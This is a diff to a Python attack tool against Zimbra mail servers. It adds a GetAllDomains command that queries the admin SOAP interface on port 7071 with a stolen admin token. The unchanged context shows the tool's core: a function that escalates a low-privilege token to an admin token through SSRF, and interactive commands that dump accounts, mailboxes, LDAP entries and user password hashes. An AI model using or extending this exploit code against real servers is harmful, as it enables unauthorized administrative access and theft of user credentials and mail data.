@@ -117,7 +117,33 @@ def lowtoken_to_admintoken_by_SSRF(uri,username,password):
     except Exception as e:
         print("[!] Error:%s"%(e))
         exit(0)
-
+	
+def getalldomains_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAllDomainsRequest xmlns="urn:zimbraAdmin">
+         </GetAllDomainsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    try:
+      print("[*] Try to get all domain names")
+      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
+      if "name" in r.text:
+        pattern_config = re.compile(r"zimbraDomainName\">(.*?)<")
+        config = pattern_config.findall(r.text)[0]
+        print("[+] Domain name: "+config)
+      else:
+        print("[!]")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+		
 def getallaccounts_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
@@ -492,6 +518,7 @@ if __name__ == '__main__':
 			admin_token = auth_request_admin(sys.argv[1],sys.argv[2],sys.argv[3])
 			print("[*] Command Mode")
 			print("Supprot command:")
+			print("      GetAllDomains")			
 			print("      GetAllMailboxes")
 			print("      GetAllAccounts")
 			print("      GetAllAdminAccounts")
@@ -504,6 +531,7 @@ if __name__ == '__main__':
 				cmd = raw_input("[$] ")
 				if cmd=='help':
 					print("Supprot command:")
+					print("      GetAllDomains")
 					print("      GetAllMailboxes")
 					print("      GetAllAccounts")
 					print("      GetAllAdminAccounts")
@@ -511,7 +539,9 @@ if __name__ == '__main__':
 					print("      GetLDAPEntries <query> <ldapSearchBase>,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com")
 					print("      getalluserhash <ldapSearchBase>,Eg:getalluserhash dc=zimbra,dc=com")
 					print("      help")
-					print("      exit")
+					print("      exit")					
+				elif cmd=='GetAllDomains':					
+					getalldomains_request(sys.argv[1],admin_token)
 				elif cmd=='GetAllMailboxes':
 					getallmailboxes_request(sys.argv[1],admin_token)
 				elif cmd=='GetAllAccounts':
@@ -536,6 +566,7 @@ if __name__ == '__main__':
 			admin_token = lowtoken_to_admintoken_by_SSRF(sys.argv[1],sys.argv[2],sys.argv[3])
 			print("[*] Command Mode")
 			print("Supprot command:")
+			print("      GetAllDomains")
 			print("      GetAllMailboxes")
 			print("      GetAllAccounts")
 			print("      GetAllAdminAccounts")
@@ -548,6 +579,7 @@ if __name__ == '__main__':
 				cmd = raw_input("[$] ")
 				if cmd=='help':
 					print("Supprot command:")
+					print("      GetAllDomains")
 					print("      GetAllMailboxes")
 					print("      GetAllAccounts")
 					print("      GetAllAdminAccounts")
@@ -556,6 +588,8 @@ if __name__ == '__main__':
 					print("      getalluserhash <ldapSearchBase>,Eg:getalluserhash dc=zimbra,dc=com")
 					print("      help")
 					print("      exit")
+				elif cmd=='GetAllDomains':					
+					getalldomains_request(sys.argv[1],admin_token)
 				elif cmd=='GetAllMailboxes':
 					getallmailboxes_request(sys.argv[1],admin_token)
 				elif cmd=='GetAllAccounts':
